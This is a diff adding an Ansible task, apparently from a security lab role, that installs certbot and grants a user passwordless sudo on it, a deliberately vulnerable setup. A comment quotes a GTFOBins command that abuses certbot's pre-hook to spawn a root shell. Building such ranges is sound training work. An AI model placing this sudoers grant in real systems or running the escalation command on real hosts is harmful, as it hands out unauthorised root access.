@@ -1,0 +1,15 @@
+---
+# GTFOBins: https://gtfobins.github.io/gtfobins/certbot/#sudo
+# Exploit: sudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir /tmp --work-dir /tmp --config-dir /tmp --pre-hook '/bin/sh 1>&0 2>&0'
+- name: (privesc/sudo_certbot) Install certbot
+  ansible.builtin.apt:
+    name: certbot
+    state: present
+    update_cache: true
+
+- name: (privesc/sudo_certbot) Grant sudo on certbot to privesc user
+  ansible.builtin.copy:
+    dest: "/etc/sudoers.d/privesc_certbot"
+    content: "{{ ludus_privesc_sudo_user }}@{{ ludus_privesc_sssd_domain }} ALL=(root) NOPASSWD: /usr/bin/certbot *\n"
+    mode: "0440"
+    validate: "visudo -cf %s"
